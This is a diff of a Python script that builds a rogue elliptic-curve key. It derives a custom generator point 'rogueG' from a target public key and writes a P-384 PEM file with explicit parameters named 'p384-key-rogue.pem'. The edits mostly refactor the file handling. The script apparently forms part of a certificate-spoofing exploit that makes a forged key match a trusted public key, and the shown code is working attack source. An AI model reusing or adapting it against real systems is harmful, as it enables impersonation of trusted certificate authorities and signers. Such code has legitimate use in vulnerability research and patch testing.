@@ -19,16 +19,16 @@ rogueG = privkey_inv * Q
 rogueG = unhexlify(b"04" + f'{rogueG.x:x}'.encode() + f'{rogueG.y:x}'.encode())
 
 # Generate the file with explicit parameters
-with open('p384-key.pem', mode='rt')as handle:
-    keyfile = PEM.decode(handle.read())
+f = open('p384-key.pem','rt')
+keyfile = PEM.decode(f.read())
 #print(hexlify(keyfile[0]))
-
+f.close()
 seq_der = DerSequence()
-seq_der.decode(keyfile[0])
+der = seq_der.decode(keyfile[0])
 
 # Replace private key
 octet_der = DerOctetString(privkey)
-seq_der[1] = octet_der.encode()
+der[1] = octet_der.encode()
 
 # Replace public key
 #print(hexlify(der[3]))
@@ -46,7 +46,8 @@ der[2] = der[2][:4] + s.encode()
 #print(hexlify(der[2]))
 
 # Generate new file
-with open('p384-key-rogue.pem', mode='w')as handle:
+f = open('p384-key-rogue.pem','w')
 #print(hexlify(der.encode()))
-    keyfile = PEM.encode(der.encode(), 'EC PRIVATE KEY')
-    handle.write(keyfile)
+keyfile = PEM.encode(der.encode(), 'EC PRIVATE KEY')
+f.write(keyfile)
+f.close()
